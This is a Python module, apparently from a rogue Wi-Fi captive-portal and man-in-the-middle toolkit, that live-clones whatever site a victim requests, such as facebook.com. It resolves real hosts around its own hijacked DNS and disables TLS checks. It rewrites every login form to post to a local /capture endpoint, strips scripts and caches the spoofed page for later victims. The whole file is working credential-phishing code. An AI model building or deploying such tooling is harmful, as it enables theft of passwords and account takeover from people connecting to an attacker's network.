"""mirror.py - Live-clone a target URL into the spoof template library.

When a victim hits the captive HTTP server with Host: facebook.com and
MITM is enabled (and Spoof had no entry), this module fetches the real
site, rewrites every <form action> to /capture, neutralizes outbound
<script> requests, and writes the result to templates/spoof/<host>/
index.html so the next victim gets it instantly without a fetch.

This is the "any site" template generator. It needs upstream internet
(via wlan0cli) to fetch.
"""

import http.client
import os
import re
import socket
import ssl
import subprocess


HERE = os.path.dirname(os.path.abspath(__file__))
SPOOF_DIR = os.path.join(HERE, 'templates', 'spoof')

UPSTREAM_DNS = '1.1.1.1'  # used to bypass our own hijacked dnsmasq
USER_AGENT = ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
              '(KHTML, like Gecko) Chrome/120 Safari/537.36')


def _resolve_upstream(host):
    """Resolve host by talking to UPSTREAM_DNS directly. The pager's
    own dnsmasq is hijacked while spoof/mitm is on (it answers every
    query with 172.16.52.1), so socket.gethostbyname() would loop
    us back into the captive server. Going around dnsmasq is the
    only way to reach the real upstream."""
    try:
        r = subprocess.run(['nslookup', host, UPSTREAM_DNS],
                            capture_output=True, text=True, timeout=4)
    except Exception:
        return None
    saw_query_block = False
    for line in r.stdout.split('\n'):
        line = line.strip()
        if line.startswith('Name:'):
            saw_query_block = True
            continue
        if saw_query_block and line.startswith('Address'):
            ip = line.split(':', 1)[1].strip() if ':' in line else line
            ip = ip.split()[-1]
            if '.' in ip and not ip.startswith('172.16.52.'):
                return ip
    return None


def _fetch(host, scheme='https', path='/'):
    """Fetch a path from host, bypassing local DNS.

    Resolves via UPSTREAM_DNS, opens an HTTPS or HTTP connection
    directly to that IP, and sends a Host header so virtual-hosted
    sites return the right content. TLS verification is disabled
    because we're connecting by IP and that breaks SNI/cert checks.
    """
    ip = _resolve_upstream(host)
    if not ip:
        return None
    headers = {
        'Host': host,
        'User-Agent': USER_AGENT,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close',
    }
    try:
        if scheme == 'https':
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(ip, 443, context=ctx,
                                                timeout=8)
        else:
            conn = http.client.HTTPConnection(ip, 80, timeout=8)
        conn.request('GET', path, headers=headers)
        resp = conn.getresponse()
        body = resp.read()
        conn.close()
        return body
    except Exception:
        return None


def clear_cache():
    """Wipe the entire spoof library. Returns the count of host
    directories removed."""
    import shutil
    if not os.path.isdir(SPOOF_DIR):
        return 0
    count = 0
    for entry in os.listdir(SPOOF_DIR):
        p = os.path.join(SPOOF_DIR, entry)
        if os.path.isdir(p):
            try:
                shutil.rmtree(p)
                count += 1
            except Exception:
                pass
    return count


def cache_count():
    """Number of cached host directories in the spoof library."""
    if not os.path.isdir(SPOOF_DIR):
        return 0
    return sum(1 for e in os.listdir(SPOOF_DIR)
               if os.path.isdir(os.path.join(SPOOF_DIR, e)))


def list_cached_hosts():
    """Return a list of (host, asset_count, total_bytes) tuples for
    every cloned host in the spoof library, sorted alphabetically."""
    out = []
    if not os.path.isdir(SPOOF_DIR):
        return out
    for entry in sorted(os.listdir(SPOOF_DIR)):
        host_dir = os.path.join(SPOOF_DIR, entry)
        if not os.path.isdir(host_dir):
            continue
        asset_count = 0
        total_bytes = 0
        for root, _, files in os.walk(host_dir):
            for f in files:
                if f.endswith('.ctype'):
                    continue
                asset_count += 1
                try:
                    total_bytes += os.path.getsize(os.path.join(root, f))
                except Exception:
                    pass
        out.append((entry, asset_count, total_bytes))
    return out


def remove_host(host):
    """Delete the cache entry for a single host. Returns True on success."""
    import shutil
    p = os.path.join(SPOOF_DIR, host)
    if not os.path.isdir(p):
        return False
    try:
        shutil.rmtree(p)
        return True
    except Exception:
        return False


def passthrough(host, path):
    """Fetch any path from a host (assets, css, images, etc) and
    return (status, content_type, body) bytes — or None on failure.

    Used by the captive HTTP server to proxy non-HTML asset requests
    through to the real upstream, so cloned pages still load images
    and styles. Tries HTTPS first, falls back to HTTP.
    """
    for scheme in ('https', 'http'):
        ip = _resolve_upstream(host)
        if not ip:
            return None
        headers = {
            'Host': host,
            'User-Agent': USER_AGENT,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'close',
        }
        try:
            if scheme == 'https':
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                conn = http.client.HTTPSConnection(ip, 443, context=ctx,
                                                    timeout=6)
            else:
                conn = http.client.HTTPConnection(ip, 80, timeout=6)
            conn.request('GET', path, headers=headers)
            resp = conn.getresponse()
            body = resp.read()
            ctype = resp.getheader('Content-Type', 'application/octet-stream')
            status = resp.status
            conn.close()
            if 200 <= status < 400:
                return (status, ctype, body)
        except Exception:
            continue
    return None


def clone_to_spoof_library(host, scheme='https'):
    """Fetch host, rewrite forms, save to templates/spoof/<host>/index.html.

    Returns True on success (file exists after the call), False otherwise.
    Caches the result so subsequent visitors hit the local file without
    re-fetching. Tries HTTPS first, falls back to HTTP if HTTPS fails.
    """
    if not host:
        return False
    target_dir = os.path.join(SPOOF_DIR, host)
    target_html = os.path.join(target_dir, 'index.html')
    if os.path.isfile(target_html):
        return True  # already cached

    raw = _fetch(host, scheme='https')
    if raw is None:
        raw = _fetch(host, scheme='http')
    if raw is None:
        return False

    try:
        html = raw.decode('utf-8', errors='replace')
    except Exception:
        return False

    rewritten = _rewrite_html(html, host)

    try:
        os.makedirs(target_dir, exist_ok=True)
        with open(target_html, 'w') as f:
            f.write(rewritten)
        return True
    except Exception:
        return False


def _rewrite_html(html, host):
    """Mangle the HTML so every form posts to /capture and outbound
    scripts/asset references don't phone home or break the page."""
    # 1. Rewrite <form action="..."> → action="/capture"
    html = re.sub(
        r'(<form[^>]*\s)action\s*=\s*"[^"]*"',
        r'\1action="/capture"',
        html, flags=re.IGNORECASE)
    html = re.sub(
        r"(<form[^>]*\s)action\s*=\s*'[^']*'",
        r'\1action="/capture"',
        html, flags=re.IGNORECASE)
    # Forms that have no action attribute at all default to current
    # URL — inject one.
    html = re.sub(
        r'<form([^>]*)>',
        lambda m: '<form' + (m.group(1) if 'action' in m.group(1).lower()
                              else m.group(1) + ' action="/capture"') + '>',
        html, flags=re.IGNORECASE)

    # 2. Force POST method on all forms (some sites use GET to a real
    # endpoint which would 404 against our handler)
    html = re.sub(
        r'(<form[^>]*?)method\s*=\s*"[^"]*"',
        r'\1method="POST"',
        html, flags=re.IGNORECASE)

    # 3. Strip <script> tags that would phone home and break the page
    # (we keep the visual layout but kill JS-driven submission).
    html = re.sub(r'<script\b[^>]*>.*?</script>',
                   '', html, flags=re.IGNORECASE | re.DOTALL)
    html = re.sub(r'<script\b[^/]*/>', '', html, flags=re.IGNORECASE)

    # 4. Leave absolute and root-relative asset URLs alone. Earlier
    # versions force-rewrote /foo → https://host/foo, but that
    # breaks HTTP-only sites (neverssl, httpforever, etc) where
    # https:// just refuses connection. The captive server has an
    # asset passthrough that proxies non-root paths to the real
    # upstream, so leaving the URLs as-is lets the browser request
    # them via http://host/foo, our nft port-80 redirect catches
    # them, and the passthrough fetches and returns them.
    # Protocol-relative URLs (//cdn.foo/x) would still escape our
    # interception (browser would pick the page scheme, then DNS-
    # lookup cdn.foo and connect directly), so coerce those to
    # absolute http:// so they hit our redirect.
    html = re.sub(
        r'(href|src|action)\s*=\s*(["\'])(//)([^"\']*)\2',
        lambda m: f'{m.group(1)}={m.group(2)}http://{m.group(4)}{m.group(2)}',
        html, flags=re.IGNORECASE)

    # 5. Drop an HTML comment in <head> for diagnostic grepping.
    # The visible red banner is injected at SERVE time by server.py
    # (controlled by a runtime toggle), not baked into the cache —
    # otherwise toggling would require re-cloning every host.
    head_comment = (
        '<!-- pagerctl_home captive mirror — generated for {host} -->\n'
    ).format(host=host)
    if '<head>' in html.lower():
        html = re.sub(r'<head>', '<head>\n' + head_comment, html,
                       count=1, flags=re.IGNORECASE)
    else:
        html = head_comment + html

    return html
